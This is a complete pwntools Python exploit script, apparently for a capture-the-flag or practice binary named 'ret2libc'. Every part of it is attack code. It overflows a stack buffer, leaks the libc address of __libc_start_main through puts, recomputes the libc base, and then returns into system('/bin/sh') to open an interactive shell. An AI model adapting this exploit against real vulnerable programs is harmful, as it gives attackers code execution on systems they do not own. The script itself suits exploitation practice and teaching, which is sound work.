from pwn import *

# the binary is a 32-bit little-endian ELF
context.update(arch='i386', endian='little', os='linux')

elf = ELF('./ret2libc')
libc = ELF('./libc6_2.31-0ubuntu9_i386.so')

p = elf.process()
fp = open('payload', 'wb+')

func = '__libc_start_main'

offset = 44
puts_plt = 0x8049080

p.recvuntil(b'Get access to the shell!\n')
# Payload 1
payload = b'A' * offset
payload += p32(puts_plt)						# call puts function to print contents of pointer
payload += p32(elf.symbols['vuln'])				# return to vuln after leak
payload += p32(elf.got[func])					# the pointer to GOT value of func

fp.write(payload + b'\n')
p.sendline(payload)

leaked_func = u32(p.recvline()[:4])
log.info(f'Leaked {func} : ' + hex(leaked_func))

# set the base address of libc
# all subsequent calls through libc will be adjusted by this address
# as part of pwn's functionality
libc.address = leaked_func - libc.symbols[func]		
# Payload 2
payload = b'A' * offset
payload += p32(libc.symbols['system'])			# call the 
payload += p32(libc.symbols['exit'])			# return address to exit, can be anything
payload += p32(next(libc.search(b'/bin/sh')))	# argument to 'system' function

# this payload is saved into the file just for
# its use with GDB. Since the address is dynamically
# leaked, this payload cannot be used for further 
# runs of the program. Hence python code must be used.
fp.write(payload + b'\n')
p.sendline(payload)

fp.close()
p.interactive()